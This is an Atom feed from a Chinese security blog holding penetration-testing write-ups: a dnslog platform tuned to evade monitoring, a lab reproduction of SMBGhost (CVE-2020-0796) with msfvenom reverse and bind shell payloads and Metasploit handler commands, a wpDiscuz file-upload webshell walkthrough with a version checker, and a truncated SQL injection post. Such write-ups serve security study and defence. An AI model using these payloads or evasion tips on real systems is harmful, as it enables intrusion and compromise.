<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>九指</title>
  
  
  <link href="http://blog.ninefiger.top/atom.xml" rel="self"/>
  
  <link href="http://blog.ninefiger.top/"/>
  <updated>2021-05-12T06:49:08.000Z</updated>
  <id>http://blog.ninefiger.top/</id>
  
  <author>
    <name>ninefiger</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>dnslog平台探索</title>
    <link href="http://blog.ninefiger.top/2021/05/06/dnslog%E5%B9%B3%E5%8F%B0%E6%8E%A2%E7%B4%A2/"/>
    <id>http://blog.ninefiger.top/2021/05/06/dnslog%E5%B9%B3%E5%8F%B0%E6%8E%A2%E7%B4%A2/</id>
    <published>2021-05-05T16:00:00.000Z</published>
    <updated>2021-05-12T06:49:08.000Z</updated>
    
    <content type="html"><![CDATA[<p>&emsp;&emsp;在蓝军防守过程中，遇到一些告警的流量中，出现很明显的dnslog平台的痕迹，比如：验证fastjson时，payload时xxx.dnslog.cn，这种流量会直接触发反序列化攻击的攻击，那么对于这个攻击的防护算检测到了，但是如果使用一些编码绕过了流量的识别呢？实际上越来越多的安全监控将dnslog.cn、ceye.io加入到针对dns流量的分析中；一次真实的溯源工作中，我们通过ceye.io的id找到了真实的攻击者，这表示公用的dnslog平台已经不能用来做更加隐蔽攻击探测。<br>&emsp;&emsp;实际上很多的团队已经自己搭建dnslog平台，或将dnlog功能加入到自建的安全攻击平台中。</p><p>一个简单、实用、安全的dnslog平台有哪些需求呢？</p><ul><li>方便启动</li><li>账号分权</li><li>管理端的安全性</li><li>域名更隐蔽<br>…</li></ul><h3 id="选取一套合适的开源代码"><a href="#选取一套合适的开源代码" class="headerlink" title="选取一套合适的开源代码"></a>选取一套合适的开源代码</h3><p>&emsp;&emsp;有精力的话，可以自己从开始编写代码，但是这样有点耗费时间，github上已经有很多开源的项目，这里挑出来3个。</p><blockquote><p>java版本：<br><a href="https://github.com/SPuerBRead/Bridge">https://github.com/SPuerBRead/Bridge</a><br>python版本：<br><a href="https://github.com/BugScanTeam/DNSLog">https://github.com/BugScanTeam/DNSLog</a><br>golang版本：<br><a href="https://github.com/chennqqi/godnslog">https://github.com/chennqqi/godnslog</a><br>我选择了SPuerBRead的Bridge，功能介绍可以参考该项目的readme。</p></blockquote><h3 id="修改代码"><a href="#修改代码" class="headerlink" title="修改代码"></a>修改代码</h3><p>&emsp;&emsp;SPuerBRead的这台平台已经可以做到很方便的启动、dnslog、httplog的记录功能了，但是对于自己使用起来，还有一些小需求，于是做了一些的修改。<br>如下是一些想法和作出的改动</p><h5 id="Q1：启动后登录，注册的用户会生成logid字段，该字段是数字类型，值是1、2、3、4-。。。，这样导致用户的dnslog验证的payload地址是这样的："><a href="#Q1：启动后登录，注册的用户会生成logid字段，该字段是数字类型，值是1、2、3、4-。。。，这样导致用户的dnslog验证的payload地址是这样的：" class="headerlink" title="Q1：启动后登录，注册的用户会生成logid字段，该字段是数字类型，值是1、2、3、4 。。。，这样导致用户的dnslog验证的payload地址是这样的："></a>Q1：启动后登录，注册的用户会生成logid字段，该字段是数字类型，值是1、2、3、4 。。。，这样导致用户的dnslog验证的payload地址是这样的：</h5><p>xxx.1.dnslog.com<br><img src="/img/dnslog%E5%B9%B3%E5%8F%B0%E6%8E%A2%E7%B4%A2/%E4%BF%AE%E6%94%B9%E5%89%8D.jpg" alt="修改前"><br>这样对于监控来说，很可能会觉得如果有内网解析这样的dns请求是很奇怪的。<br><strong>A：</strong>修改了用户logid字段类型为varchar类型，在注册用户是生成为随机的4位字符。<br><img src="/img/dnslog%E5%B9%B3%E5%8F%B0%E6%8E%A2%E7%B4%A2/%E4%BF%AE%E6%94%B9%E5%90%8E.jpg" alt="修改后"></p><h5 id="Q2：原程序中任何子域的解析请求都会响应并记录到数据库中，这样一旦遇到爆破dns记录的情况，会导致数据库中大量垃圾数据。"><a href="#Q2：原程序中任何子域的解析请求都会响应并记录到数据库中，这样一旦遇到爆破dns记录的情况，会导致数据库中大量垃圾数据。" class="headerlink" title="Q2：原程序中任何子域的解析请求都会响应并记录到数据库中，这样一旦遇到爆破dns记录的情况，会导致数据库中大量垃圾数据。"></a>Q2：原程序中任何子域的解析请求都会响应并记录到数据库中，这样一旦遇到爆破dns记录的情况，会导致数据库中大量垃圾数据。</h5><p>A2：在返回解析结果时检查库中是否有request对应logid，如果不存在则不响应任何内容</p><h5 id="Q3：对web访问做限制，只有自己或小伙伴可以访问管理端。"><a href="#Q3：对web访问做限制，只有自己或小伙伴可以访问管理端。" class="headerlink" title="Q3：对web访问做限制，只有自己或小伙伴可以访问管理端。"></a>Q3：对web访问做限制，只有自己或小伙伴可以访问管理端。</h5><p>A2：自定义header字段的判断，只放过自定义header验证正确的请求，有关Header-Signal的值，可以指定springboot启动参数位置自定义。<br><img src="/img/dnslog%E5%B9%B3%E5%8F%B0%E6%8E%A2%E7%B4%A2/%E8%87%AA%E5%AE%9A%E4%B9%89header%E6%AD%A3%E7%A1%AE%E7%9A%84%E8%AF%B7%E6%B1%82.jpg" alt="自定义header正确的请求"></p><p><img src="/img/dnslog%E5%B9%B3%E5%8F%B0%E6%8E%A2%E7%B4%A2/%E8%87%AA%E5%AE%9A%E4%B9%89header%E9%94%99%E8%AF%AF%E7%9A%84%E8%AF%B7%E6%B1%82.jpg" alt="自定义header错误的请求"></p><p>其他也更新了一些小功能，比如logid的显示，dnslog界面显示payload等。</p><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>启动参数可以参考帮助信息或项目readme</p><blockquote><p>这里有一个有意思的地方：在网上看过几片文章，有些写着需要两个域名来实现自定义解析的功能，这里试验了一下，其实使用一个域名服务就可以实现。</p></blockquote><p>首先我们看下两个域名的一个解析流程<br><img src="/img/dnslog%E5%B9%B3%E5%8F%B0%E6%8E%A2%E7%B4%A2/%E4%B8%A4%E4%B8%AA%E5%9F%9F%E5%90%8D%E7%9A%84%E9%85%8D%E7%BD%AE.jpg" alt="两个域名的解析流程"></p><p>实际上，一个域名也可以配置<br><img src="/img/dnslog%E5%B9%B3%E5%8F%B0%E6%8E%A2%E7%B4%A2/dns%E9%85%8D%E7%BD%AE%E6%88%AA%E5%9B%BE.jpg" alt="-w1001"></p><p>这样的解析过程就可以依靠一个域名、一个vps完成。<br><img src="/img/dnslog%E5%B9%B3%E5%8F%B0%E6%8E%A2%E7%B4%A2/%E4%B8%80%E4%B8%AA%E5%9F%9F%E5%90%8D%E7%9A%84%E9%85%8D%E7%BD%AE.jpg" alt="一个域名的解析过程"><br>从dns解析的trace也可以清晰的看到解析路径。<br><img src="/img/dnslog%E5%B9%B3%E5%8F%B0%E6%8E%A2%E7%B4%A2/dnsTrace.jpg" alt="dnstrace"><br><img src="/img/dnslog%E5%B9%B3%E5%8F%B0%E6%8E%A2%E7%B4%A2/16206419670337.jpg" alt="-w1144"></p><p>搭建完了才发现，原作者也是一个域名。。。</p><h3 id="end"><a href="#end" class="headerlink" title="end"></a>end</h3><p>&emsp;&emsp;还有一个小思路，现在很多dnslog平台，在返回解析记录时，将所有解析记录都指向127.0.0.1，对于安全监控来说，完全可以在针对dns流量的审计中，增加判断，当检测到存在127.0.0.1的response返回包时，触发告警疑似dnslog请求。所以在搭建的时候，配置平台默认返回的解析结果尽量指定一个可信的公网ip。</p><blockquote><p>项目源代码上传至：<a href="https://github.com/ninefiger/dnslogPt">https://github.com/ninefiger/dnslogPt</a><br>感谢原版作者：<a href="https://github.com/SPuerBRead/Bridge">https://github.com/SPuerBRead/Bridge</a></p></blockquote>]]></content>
    
    
    <summary type="html">dnslog平台真的好用么？</summary>
    
    
    
    <category term="攻防研究" scheme="http://blog.ninefiger.top/categories/%E6%94%BB%E9%98%B2%E7%A0%94%E7%A9%B6/"/>
    
    
    <category term="攻防研究" scheme="http://blog.ninefiger.top/tags/%E6%94%BB%E9%98%B2%E7%A0%94%E7%A9%B6/"/>
    
  </entry>
  
  <entry>
    <title>win10—SMB3_CVE-2020-0796复现</title>
    <link href="http://blog.ninefiger.top/2020/11/22/win10%E2%80%94SMB3-CVE-2020-0796%E5%A4%8D%E7%8E%B0/"/>
    <id>http://blog.ninefiger.top/2020/11/22/win10%E2%80%94SMB3-CVE-2020-0796%E5%A4%8D%E7%8E%B0/</id>
    <published>2020-11-22T11:47:48.000Z</published>
    <updated>2021-08-28T01:39:18.899Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-准备工作"><a href="#0x01-准备工作" class="headerlink" title="0x01 准备工作"></a>0x01 准备工作</h3><ol><li>环境<ul><li>被攻击点：Microsoft Windows 10（1903）- 192.168.0.26</li><li>攻击机：kali - 192.168.0.23</li></ul></li><li>工具<ul><li>SMBGhost_RCE_PoC （<a href="https://github.com/chompie1337/SMBGhost_RCE_PoC%EF%BC%89">https://github.com/chompie1337/SMBGhost_RCE_PoC）</a></li><li>Metasploit （kali）</li></ul></li></ol><h3 id="0x02-扫描确认漏洞是否存在"><a href="#0x02-扫描确认漏洞是否存在" class="headerlink" title="0x02 扫描确认漏洞是否存在"></a>0x02 扫描确认漏洞是否存在</h3><p>​        直接使用奇安信的扫描工具，扫描目标系统是否存在漏洞。</p><p>下载链接：<a href="http://dl.qianxin.com/skylar6/CVE-2020-0796-Scanner.zip">http://dl.qianxin.com/skylar6/CVE-2020-0796-Scanner.zip</a> </p><p><img src="/img/win10%E2%80%94SMB3_CVE-2020-0796%E5%A4%8D%E7%8E%B0/%E6%89%AB%E6%8F%8F%E7%9B%AE%E6%A0%87%E7%B3%BB%E7%BB%9F.jpg" alt="扫描目标系统"></p><h3 id="0x03-生成payload并攻击"><a href="#0x03-生成payload并攻击" class="headerlink" title="0x03 生成payload并攻击"></a>0x03 生成payload并攻击</h3><ol><li><p>msf正向连接Shell</p><p>a. 生成payload</p></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=81 -b <span class="string">&#x27;\x00&#x27;</span> -f python</span><br></pre></td></tr></table></figure><p><img src="/img/win10%E2%80%94SMB3_CVE-2020-0796%E5%A4%8D%E7%8E%B0/%E6%AD%A3%E5%90%91%E8%BF%9E%E6%8E%A5payload.jpg" alt="生成payload1"></p><p>​        b. 复制buf，修改SMBGhost_RCE_PoC中USER_PAYLOAD变量为payload</p><p><img src="/img/win10%E2%80%94SMB3_CVE-2020-0796%E5%A4%8D%E7%8E%B0/%E6%9B%BF%E6%8D%A2exploit.py.jpg" alt="修改exp"></p><p>​        c. msf开启监听</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/bind_tcp</span><br><span class="line"><span class="built_in">set</span> LPORT <span class="number">81</span></span><br><span class="line"><span class="built_in">set</span> RHOST <span class="number">192.168</span><span class="number">.0</span><span class="number">.26</span></span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p>​        d. 运行exploit.py，发送payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 exploit.py -ip 192.168.0.26</span><br></pre></td></tr></table></figure><p><img src="/img/win10%E2%80%94SMB3_CVE-2020-0796%E5%A4%8D%E7%8E%B0/%E6%AD%A3%E5%90%91getshell.jpg" alt="正向getshell"></p><ol start="2"><li><p>msf反向反弹Shell</p><p>a. 生成payload</p></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.23 LPORT=80 -b <span class="string">&#x27;\x00&#x27;</span> -f python</span><br></pre></td></tr></table></figure><p><img src="/img/win10%E2%80%94SMB3_CVE-2020-0796%E5%A4%8D%E7%8E%B0/%E5%8F%8D%E5%90%91%E8%BF%9E%E6%8E%A5payload.png" alt="生成payload1"></p><p>​        b. 修改SMBGhost_RCE_PoC中USER_PAYLOAD变量</p><p>​        c. msf开启监听</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> LPORT <span class="number">80</span></span><br><span class="line"><span class="built_in">set</span> LHOST <span class="number">192.168</span><span class="number">.0</span><span class="number">.23</span></span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p>​        d. 运行exploit.py，发送payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 exploit.py -ip 192.168.0.26</span><br></pre></td></tr></table></figure><p><img src="/img/win10%E2%80%94SMB3_CVE-2020-0796%E5%A4%8D%E7%8E%B0/%E5%8F%8D%E5%90%91getshell.jpg" alt="反向getshell"></p><h3 id="0x04-小坑和总结"><a href="#0x04-小坑和总结" class="headerlink" title="0x04 小坑和总结"></a>0x04 小坑和总结</h3><ol><li>可以根据实际情况生成payload，即实际网络环境来决定正向还是反向，大多数内网环境由于NAT转换和边界防火墙导致不能直接访问内网的服务，还是建议用反向的将目标权限反弹出来。</li><li>测试的时候目标机器在另一台物理机，本来想远程上去，一起截图证明一下，后台发现，远程的时候，发送反向的payload会导致蓝屏，具体原因没分析。</li><li>测试了Cobalt Strike生成的payload，一打就蓝屏，原因不知道，但是还是希望能用cs搞，cs还是好用些。</li></ol>]]></content>
    
    
    <summary type="html">Win rce test</summary>
    
    
    
    <category term="cve复现" scheme="http://blog.ninefiger.top/categories/cve%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="windows" scheme="http://blog.ninefiger.top/tags/windows/"/>
    
    <category term="远程代码执行" scheme="http://blog.ninefiger.top/tags/%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
    
  </entry>
  
  <entry>
    <title>wordpress评论插件wpDiscuz任意文件上传漏洞分析</title>
    <link href="http://blog.ninefiger.top/2020/08/10/wordpress%E8%AF%84%E8%AE%BA%E6%8F%92%E4%BB%B6wpDiscuz%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>http://blog.ninefiger.top/2020/08/10/wordpress%E8%AF%84%E8%AE%BA%E6%8F%92%E4%BB%B6wpDiscuz%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</id>
    <published>2020-08-09T16:00:00.000Z</published>
    <updated>2021-08-28T01:38:54.448Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>​&nbsp;&nbsp;在t00ls上看到某wordpress站点被上传webshell，下载了access日志分析了一下，判断攻击路径：访问了某页面后 -&gt; 访问了/wp-admin/admin-ajax.php?action=wmuUploadFiles接口 -&gt; 访问webshell，因此确定是这个模块有问题；官网显示V7.0.5修复了一次安全漏洞，于是下载V7.0.3版本学习一下（7.0.4没找到）。</p><p><img src="/img/wordpress%E8%AF%84%E8%AE%BA%E6%8F%92%E4%BB%B6wpDiscuz%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1.png" alt="1"></p><h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><ul><li>php 5.6.40</li><li>mysql 5.7.26</li><li>Phpstorm</li><li>Wordpress 5.4.1 + wpdiscuz V 7.0.3</li></ul><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><ol><li>环境搭建后，手动安装wpdiscuz插件后，看到文章下增加评论模块</li></ol><img src="/img/wordpress评论插件wpDiscuz任意文件上传漏洞分析/2.png" alt="16" style="zoom: 33%;" /><ol start="2"><li>phpstorm导入web目录，点击图片按钮，上传一个php文件测试一下，上传路径是<a href="http://127.0.0.1:8888/wordpress/wp-admin/admin-ajax.php%EF%BC%8C%E9%BB%98%E8%AE%A4%E6%98%AF%E4%B8%8A%E4%BC%A0%E4%B8%8D%E4%BA%86%E7%9A%84%E3%80%82">http://127.0.0.1:8888/wordpress/wp-admin/admin-ajax.php，默认是上传不了的。</a></li></ol><p><img src="/img/wordpress%E8%AF%84%E8%AE%BA%E6%8F%92%E4%BB%B6wpDiscuz%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/3.png" alt="3"></p><ol start="3"><li>从入口点分析，如图是wp_filter的action过滤</li></ol><p><img src="/img/wordpress%E8%AF%84%E8%AE%BA%E6%8F%92%E4%BB%B6wpDiscuz%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/4.png" alt="4"></p><ol start="4"><li>跟进去，可以看到上传的功能点，再进去</li></ol><p><img src="/img/wordpress%E8%AF%84%E8%AE%BA%E6%8F%92%E4%BB%B6wpDiscuz%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/5.png" alt="5"></p><ol start="5"><li>可以看到如图位置，使用getMimeType方法根据文件内容获取文件类型，并不是通过文件后缀名判断，进一步根据$mineType判断是否是允许的上传类型。</li></ol><p><img src="/img/wordpress%E8%AF%84%E8%AE%BA%E6%8F%92%E4%BB%B6wpDiscuz%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/6.png" alt="6"></p><ol start="6"><li>跟入查看isAllowedFileType方法，在判斷$mineType是否在$this -&gt; options -&gt; content[“wmuMimeTypes”]中存在。</li></ol><p><img src="/img/wordpress%E8%AF%84%E8%AE%BA%E6%8F%92%E4%BB%B6wpDiscuz%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/7.png" alt="7"></p><ol start="7"><li>如图，进入$options中，可以content[“wmuMimeTypes”]使用三目运算判断，搜索上下文得知，结果就是$defaultOptions[self::TAB_CONTENT][“wmuMimeTypes”]</li></ol><p><img src="/img/wordpress%E8%AF%84%E8%AE%BA%E6%8F%92%E4%BB%B6wpDiscuz%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/8.png" alt="8"></p><ol start="8"><li>进入$defaultOptions中可以得到最终$this -&gt; options -&gt; content[“wmuMimeTypes”]的值是几种常见的图片类型。</li></ol><p><img src="/img/wordpress%E8%AF%84%E8%AE%BA%E6%8F%92%E4%BB%B6wpDiscuz%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/9.png" alt="9"></p><p><img src="/img/wordpress%E8%AF%84%E8%AE%BA%E6%8F%92%E4%BB%B6wpDiscuz%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/10.png" alt="10"></p><ol start="9"><li>很明显此时文件类型已经通过getMimeType()方法修改为text/plain了，但是回到进入isAllowedFileType的代码，发现程序只在此处对上传文件进行了判断后，直接保存了文件。</li></ol><p><img src="/img/wordpress%E8%AF%84%E8%AE%BA%E6%8F%92%E4%BB%B6wpDiscuz%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/11.png" alt="11"></p><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>如此，程序只是根据文件内容判断文件类型，并未对文件后缀进行效验，构造一个图片马，或者手动在webshell前面加上图片头信息即可绕过。</p><ol><li>把后门文件追加到图片后</li></ol><p><img src="/img/wordpress%E8%AF%84%E8%AE%BA%E6%8F%92%E4%BB%B6wpDiscuz%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/12.png" alt="12"></p><p><img src="/img/wordpress%E8%AF%84%E8%AE%BA%E6%8F%92%E4%BB%B6wpDiscuz%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/13.png" alt="13"></p><ol start="2"><li>上传并修改后缀名为php，可以看到返回路径</li></ol><p><img src="/img/wordpress%E8%AF%84%E8%AE%BA%E6%8F%92%E4%BB%B6wpDiscuz%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/14.png" alt="14"></p><ol start="3"><li>连接webshell</li></ol><p><img src="/img/wordpress%E8%AF%84%E8%AE%BA%E6%8F%92%E4%BB%B6wpDiscuz%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/15.png" alt="15"></p><h3 id="检测"><a href="#检测" class="headerlink" title="检测"></a>检测</h3><p>​        在装上wpdiscuz插件后，每个文章中都会带有如下标签信息，且带有版本号，可利用此特征编写脚本。</p><p><img src="/img/wordpress%E8%AF%84%E8%AE%BA%E6%8F%92%E4%BB%B6wpDiscuz%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/16.png" alt="16"></p><h3 id="check-version-demo"><a href="#check-version-demo" class="headerlink" title="check version demo"></a>check version demo</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">wpdiscuz</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.s = requests.session()</span><br><span class="line">        self.s.headrs = &#123;</span><br><span class="line">            <span class="string">&quot;User-Agent&quot;</span>:</span><br><span class="line">            <span class="string">&quot;Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36 Edg/80.0.361.66&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        self.nonce = <span class="string">&quot;&quot;</span></span><br><span class="line">        self.state = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">check</span>(<span class="params">self, url</span>):</span></span><br><span class="line">        res = self.s.get(url=url)</span><br><span class="line"></span><br><span class="line">        pat1 = <span class="string">&quot;wpdiscuz/themes/default/style\.css\?ver=(.*?)&#x27;&quot;</span></span><br><span class="line">        reSearch1 = re.search(pat1, res.text)</span><br><span class="line">        <span class="keyword">if</span> reSearch1 == <span class="literal">None</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;%s 评论插件不存在任意文件漏洞&quot;</span> % url) </span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        mess = reSearch1.group(<span class="number">0</span>)</span><br><span class="line">        version = reSearch1.group(<span class="number">1</span>)</span><br><span class="line">        <span class="comment"># 判断版本</span></span><br><span class="line">        vers = version.split(<span class="string">&quot;.&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">len</span>(vers) == <span class="number">3</span>):</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">int</span>(vers[<span class="number">0</span>]) == <span class="number">7</span>:</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">int</span>(vers[<span class="number">2</span>]) &lt;= <span class="number">4</span>:</span><br><span class="line">                    <span class="built_in">print</span>(url + <span class="string">&quot; 存在任意文件上传漏洞 wpdiscuz版本为 %s&quot;</span> % version)</span><br><span class="line">                    self.state = <span class="literal">True</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> self.state == <span class="literal">True</span>:</span><br><span class="line">            <span class="comment"># nonce</span></span><br><span class="line">            pat2 = <span class="string">&#x27;&quot;wmuSecurity&quot;:&quot;(.*?)&quot;&#x27;</span></span><br><span class="line">            reSearch2 = re.search(pat2, res.text)</span><br><span class="line">            nonce = reSearch2.group(<span class="number">1</span>)</span><br><span class="line">            self.nonce = nonce</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;%s 评论插件不存在任意文件漏洞&quot;</span> % url)    </span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">exp</span>(<span class="params">self, url, project, filepath</span>):</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    wpdiscuz = wpdiscuz()</span><br><span class="line">    url = sys.argv[<span class="number">1</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;检测漏洞结果:&quot;</span>)</span><br><span class="line">    wpdiscuz.check(url)</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">wpDiscuz V7.0.4以下任意文件上传</summary>
    
    
    
    <category term="代码审计" scheme="http://blog.ninefiger.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
    <category term="代码分析" scheme="http://blog.ninefiger.top/tags/%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/"/>
    
    <category term="漏洞预警" scheme="http://blog.ninefiger.top/tags/%E6%BC%8F%E6%B4%9E%E9%A2%84%E8%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>一次sm4前端参数加密下的sql盲注</title>
    <link href="http://blog.ninefiger.top/2020/05/01/%E4%B8%80%E6%AC%A1sm4%E5%89%8D%E7%AB%AF%E5%8F%82%E6%95%B0%E5%8A%A0%E5%AF%86%E4%B8%8B%E7%9A%84sql%E7%9B%B2%E6%B3%A8/"/>
    <id>http://blog.ninefiger.top/2020/05/01/%E4%B8%80%E6%AC%A1sm4%E5%89%8D%E7%AB%AF%E5%8F%82%E6%95%B0%E5%8A%A0%E5%AF%86%E4%B8%8B%E7%9A%84sql%E7%9B%B2%E6%B3%A8/</id>
    <published>2020-04-30T16:00:00.000Z</published>
    <updated>2021-08-28T01:38:39.582Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><hr><p>&emsp;&emsp;在一次授权渗透测试中，应用在前端使用sql语句拼接方式传送参数，很明显存在sql注入，提交漏洞后，用户大概不想重构项目，于是将前端参数传输前均进行加密，但是通过JS找到加密密钥后，结合py脚本还是注入了；后续用户再次升级将设计加密的JS也加密混淆了，不过还有办法找到密钥，借此分享，过程中踩坑绕弯，欢迎大表哥们交流指导。</p><h3 id="0x01-第一次常规测试"><a href="#0x01-第一次常规测试" class="headerlink" title="0x01 第一次常规测试"></a>0x01 第一次常规测试</h3><ol><li><p>如下图点击功能抓数据包，可以发现参数中明显有SQL语句，后使用1=1 和 1=2 确定了注入点，但是没有返回值，只能盲注了。。<br><img src="/img/%E4%B8%80%E6%AC%A1sm4%E5%89%8D%E7%AB%AF%E5%8F%82%E6%95%B0%E5%8A%A0%E5%AF%86%E4%B8%8B%E7%9A%84sql%E7%9B%B2%E6%B3%A8/00-%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%B8%B8%E8%A7%84%E6%B5%8B%E8%AF%95.png" alt="00-第一次常规测试"></p></li><li><p>py写个脚本，简单爆破了一下数据库长度、数据库名等信息<br><img 